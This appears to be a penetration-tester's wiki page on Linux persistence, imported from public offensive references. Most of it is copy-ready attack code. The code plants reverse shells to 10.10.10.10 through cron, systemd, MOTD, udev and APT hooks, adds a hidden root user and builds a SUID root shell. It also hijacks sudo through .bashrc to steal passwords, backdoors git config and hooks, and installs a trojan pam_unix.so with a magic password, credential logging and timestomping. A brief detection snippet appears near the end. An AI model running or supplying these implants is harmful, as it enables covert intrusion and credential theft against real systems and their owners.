---
title: Linux - Persistence
type: technique
tags: [linux, persistence, reference-import, pam]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-15
sources: [InternalAllTheThings, hacktricks-linux]
---

# Linux - Persistence

## What it is

Technical reference for **Linux - Persistence** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Linux persistence mechanisms survive reboots and maintain attacker access even when initial access vectors are remediated. Common techniques include adding SSH public keys to `~/.ssh/authorized_keys`, creating SUID binaries, installing cron jobs or systemd services, backdooring shell configuration files (`.bashrc`, `.profile`), and abusing MOTD scripts, `udev` rules, and APT hooks that execute on specific system events. These mechanisms run as the user or service account that owns the file, so root persistence often targets system-level paths that require elevated write access.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Summary

* [Basic Reverse Shell](#basic-reverse-shell)
* [Add a Root User](#add-a-root-user)
* [SUID Binary](#suid-binary)
* [Crontab](#crontab)
* [Bash Configuration File](#bash-configuration-file)
* [Startup Service](#startup-service)
* [Systemd User Service](#systemd-user-service)
* [Systemd Timer File](#systemd-timer-file)
* [Message of the Day](#message-of-the-day)
* [User Startup File](#user-startup-file)
* [Udev Rule](#udev-rule)
* [APT Configuration](#apt-configuration)
* [SSH Configuration](#ssh-configuration)
* [Git Configuration](#git-configuration)
    * [Git Configuration Variables](#git-configuration-variables)
    * [Git Hooks](#git-hooks)
* [Additional Linux Persistence Options](#additional-persistence-options)
* [References](#references)

## Basic Reverse Shell

```bash
ncat --udp -lvp 4242
ncat --sctp -lvp 4242
ncat --tcp -lvp 4242
```

## Add a Root User

```powershell
sudo useradd -ou 0 -g 0 john
sudo passwd john
echo "linuxpassword" | passwd --stdin john
```

## SUID Binary

```powershell
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
```

## Crontab

Crontab (short for cron table) is a configuration file for scheduling tasks (cron jobs) in Unix-like systems. It allows users to automate repetitive commands at specific times or intervals.

A crontab entry follows this format:

```ps1
* * * * * command-to-execute
| | | | |
| | | | └── Day of the week (0-7, Sunday = 0 or 7)
| | | └──── Month (1-12)
| | └────── Day of the month (1-31)
| └──────── Hour (0-23)
└────────── Minute (0-59)
```

Run a script every time the system reboots.

```bash
(crontab -l ; echo "@reboot sleep 200 && ncat 10.10.10.10 4242 -e /bin/bash")|crontab 2> /dev/null
```

## Bash Configuration File

The ~/.bashrc file is a user-specific configuration script for Bash (Bourne Again Shell). It runs automatically whenever a new interactive, non-login shell is opened (e.g., when opening a terminal).

Example of a backdoor in `.bash_rc` where a reverse shell is triggered when the user is using the `sudo` command:

```bash
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
cat << EOF > /tmp/$TMPNAME2
  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
EOF
if [ -f ~/.bashrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.zshrc
fi
rm /tmp/$TMPNAME2
```

Add the following line inside the user's `.bashrc` file to hijack the sudo command and write the content of the input into `/tmp/pass`.

```powershell
chmod u+x ~/.hidden/fakesudo
echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

Finally, create the `fakesudo` script.

```powershell
read -sp "[sudo] password for $USER: " sudopass
echo ""
sleep 2
echo "Sorry, try again."
echo $sudopass >> /tmp/pass.txt

/usr/bin/sudo $@
```

## Startup Service

Edit `/etc/network/if-up.d/upstart` file

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

## Systemd User Service

Create a service file in `~/.config/systemd/user/`.

```ps1
vim ~/.config/systemd/user/persistence.service
```

Add the following configuration:

```ps1
[Unit]
Description=Reverse shell[Service]
ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
Restart=always
RestartSec=60[Install]
WantedBy=default.target
```

Enable service and start service:

```ps1
systemctl --user enable persistence.service
systemctl --user start persistence.service
```

## Systemd Timer File

A Systemd Timer is a way to schedule tasks (like cron jobs) using Systemd instead of `cron`. It works alongside a corresponding service file to execute commands at specific intervals or times.

Create a timer file : `/etc/systemd/system/backdoor.timer`

```ini
[Unit]
Description=Backdoor Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
```

Create a Corresponding Service Unit File: `/etc/systemd/system/backdoor.service`

```ini
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash /opt/backdoor/backdoor.sh
```

Enable and Start the Timer

```ps1
sudo systemctl enable shout.timer
sudo systemctl start shout.timer
```

## Message of the Day

Edit `/etc/update-motd.d/00-header` file

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' >> /etc/update-motd.d/00-header
```

## User Startup File

The `~/.config/autostart/` directory is used in Linux desktop environments (like GNOME, KDE, XFCE) to automatically start applications when a user logs in.

Each startup program is defined using a .desktop file placed in this directory.

```powershell
[Desktop Entry]
Type=Application
Name=Custom Script
Exec=/home/user/scripts/startup.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
```

## Udev Rule

Udev is the device manager for the Linux kernel, responsible for dynamically handling device events. It can be exploited for persistence by executing a script whenever a specific device is plugged in.

```bash
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

After saving the rule file, reload the udev rules:

```ps1
sudo udevadm control --reload-rules
sudo udevadm trigger
```

## APT Configuration

If you can create a file on the `apt.conf.d` directory with:

```ps1
APT::Update::Pre-Invoke {"CMD"};
```

Next time "`apt-get update`" is done, your CMD will be executed!

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

## SSH Configuration

Add an SSH key into the `~/.ssh` folder.

`~/.ssh/authorized_keys` is the standard file used by SSH to store public keys that are allowed to log in to the user account. Historically `authorized_keys` handled SSH protocol version 1 keys and `authorized_keys2` handled SSH protocol version 2 keys.

1. Generate a new key with `ssh-keygen`
2. Write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys` or `~/.ssh/authorized_keys2`
3. Set the right permission

| Path/File                 | Recommended Permission | Description                                      |
|---------------------------|------------------------|--------------------------------------------------|
| `~/.ssh/`                 | `700`                  | Only the user can read/write/execute the folder  |
| `~/.ssh/authorized_keys`  | `600`                  | Only the user can read/write the file            |
| `~/.ssh/authorized_keys2` | `600`                  | Same as above; legacy/deprecated file            |

## Git Configuration

Backdooring git can be a useful way to obtain persistence without the need for root access.  
Special care must be taken to ensure that the backdoor commands create no output, otherwise the persistence is trivial to notice.

### Git Configuration Variables

There are multiple [git configuration variables](https://git-scm.com/docs/git-config) that execute arbitrary commands when certain actions are taken.  
As an added bonus, git configs can be specified multiple ways leading to additional backdoor opportunities.  
Configs can be set at the user level (`~/.gitconfig`), at the repository level (`path/to/repo/.git/config`), and sometimes via environment variables.

`core.editor` is executed whenever git needs to provide the user with an editor (e.g. `git rebase -i`, `git commit --amend`).  
The equivalent environment variable is `GIT_EDITOR`.

```properties
[core]
editor = nohup BACKDOOR >/dev/null 2>&1 & ${VISUAL:-${EDITOR:-emacs}}
```

`core.pager` is executed whenever git needs to potentially large amounts of data (e.g. `git diff`, `git log`, `git show`).  
The equivalent environment variable is `GIT_PAGER`.

```properties
[core]
pager = nohup BACKDOOR >/dev/null 2>&1 & ${PAGER:-less}
```

`core.sshCommand` is executed whenever git needs to interact with a remote *ssh* repository (e.g. `git fetch`, `git pull`, `git push`).  
The equivalent environment variable is `GIT_SSH` or `GIT_SSH_COMMAND`.

```properties
[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh
[ssh]
variant = ssh
```

Note that `ssh.variant` (`GIT_SSH_VARIANT`) is technically optional, but without it git will run `sshCommand` *twice* in rapid succession.  (The first run is to determine the SSH variant and the second to pass it the correct parameters.)

### Git Hooks

[Git hooks](https://git-scm.com/docs/githooks) are programs you can place in a hooks directory to trigger actions at certain points during git's execution.

By default, hooks are stored in a repository's `.git/hooks` directory and are run when their name matches the current git action and the hook is marked as executable (i.e. `chmod +x`).  
Potentially useful hook scripts to backdoor:

* `pre-commit` is run just before `git commit` is executed.
* `pre-push` is run just before `git push` is executed.
* `post-checkout` is run just after `git checkout` is executed.
* `post-merge` is run after `git merge` or after `git pull` applies new changes.

In addition to spawning a backdoor, some of the above hooks can be used to sneak malicious changes into a repo without the user noticing.

Lastly, it is possible to globally backdoor *all* of a user's git hooks by setting the `core.hooksPath` git config variable to a common directory in the user-level git config file (`~/.gitconfig`).  Note that this approach will break any existing repository-specific git hooks.

## Additional Persistence Options

* [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)
* [Compromise Client Software Binary](https://attack.mitre.org/techniques/T1554)
* [Create Account](https://attack.mitre.org/techniques/T1136/)
* [Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)
* [Create or Modify System Process](https://attack.mitre.org/techniques/T1543/)
* [Create or Modify System Process: Systemd Service](https://attack.mitre.org/techniques/T1543/002/)
* [Event Triggered Execution: Trap](https://attack.mitre.org/techniques/T1546/005/)
* [Event Triggered Execution](https://attack.mitre.org/techniques/T1546/)
* [Event Triggered Execution: .bash_profile and .bashrc](https://attack.mitre.org/techniques/T1546/004/)
* [External Remote Services](https://attack.mitre.org/techniques/T1133/)
* [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)
* [Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
* [Pre-OS Boot](https://attack.mitre.org/techniques/T1542/)
* [Pre-OS Boot: Bootkit](https://attack.mitre.org/techniques/T1542/003/)
* [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)
* [Scheduled Task/Job: At (Linux)](https://attack.mitre.org/techniques/T1053/001/)
* [Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
* [Server Software Component](https://attack.mitre.org/techniques/T1505/)
* [Server Software Component: SQL Stored Procedures](https://attack.mitre.org/techniques/T1505/001/)
* [Server Software Component: Transport Agent](https://attack.mitre.org/techniques/T1505/002/)
* [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
* [Traffic Signaling](https://attack.mitre.org/techniques/T1205/)
* [Traffic Signaling: Port Knocking](https://attack.mitre.org/techniques/T1205/001/)
* [Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/)
* [Valid Accounts: Domain Accounts 2](https://attack.mitre.org/techniques/T1078/002/)

## References

* [apt.conf.d backdoor- RandoriSec - September 3, 2018](https://twitter.com/RandoriSec/status/1036622487990284289)
* [g0t r00t? pwning a machine - muelli - June 25, 2009](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
* [Modern Linux Rootkits 101 - Tyler Borland (TurboBorland) - September 20, 2013](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
* [[Hacking-Contest] Rootkit - Jakob Lell - May 7, 2014](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)

## PAM backdoor persistence (pam_unix trojan, pam_exec cred capture, authselect survival)

PAM mediates every SSH/console login through `pam_sm_authenticate()` in `pam_unix.so`, making it a durable root persistence and credential-harvest point. Two implant styles: replace the library, or add a one-line rule.

Trojan `pam_unix.so`: a few lines of C give a magic password that always returns `PAM_SUCCESS` and logs real creds to a hidden file, falling through to the original via `dlsym(RTLD_NEXT, ...)`.

```c
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user, *pass; pam_get_user(pamh,&user,NULL); pam_get_authtok(pamh,PAM_AUTHTOK,&pass,NULL);
    if (pass && strcmp(pass,"Sup3rS3cret!")==0) return PAM_SUCCESS;                 // magic pwd
    int fd=open("/usr/bin/.dbus.log",O_WRONLY|O_APPEND|O_CREAT,0600); dprintf(fd,"%s:%s\n",user,pass); close(fd);
    if(!orig) orig=dlsym(RTLD_NEXT,"pam_sm_authenticate"); return orig(pamh,flags,argc,argv);
}
```

```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
install -m644 pam_unix.so /lib/security/pam_unix.so     # atomic; keep original perms
touch -r /bin/ls /lib/security/pam_unix.so              # timestomp
```

Lighter touch: append a `pam_exec` line so every SSH auth runs an implant while the normal stack stays intact. `expose_authtok` feeds the typed password on stdin; PAM exposes `PAM_USER`/`PAM_RHOST`/`PAM_SERVICE`/`PAM_TTY`.

```bash
# /etc/pam.d/sshd  (auth phase = runs before session, ideal for cred capture)
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
# session optional pam_exec.so ... is better for post-login actions (spawn detached daemon)
```

Placement matters more than payload: editing a shared stack (`system-auth`, `common-auth`) via `include`/`substack` fans the implant across many services; `[success=1 default=ignore]` bracketed controls can skip a module after a custom check instead of visibly replacing `pam_unix.so`. On RHEL/Fedora, `/etc/pam.d/system-auth` is regenerated by `authselect` (look for the "Generated by authselect" banner), so real persistence lives in `/etc/authselect/custom/<profile>/`; edit templates there then `authselect select custom/<profile>`. Detection and hunt (matches the 2025 "Plague" PAM backdoor which added `HISTFILE=/dev/null` cleanup post-auth): compare hashes against packages, find unpackaged `.so`, audit rule on the module.

```bash
rpm -V pam 2>/dev/null || debsums -s libpam-modules
for f in /{lib,usr/lib}{,64}/security/*.so; do dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f"; done
# auditd: -w /lib/security/pam_unix.so -p wa -k pam-backdoor
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[john]]

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
- HackTricks linux-hardening (ingest slug `hacktricks-linux`).
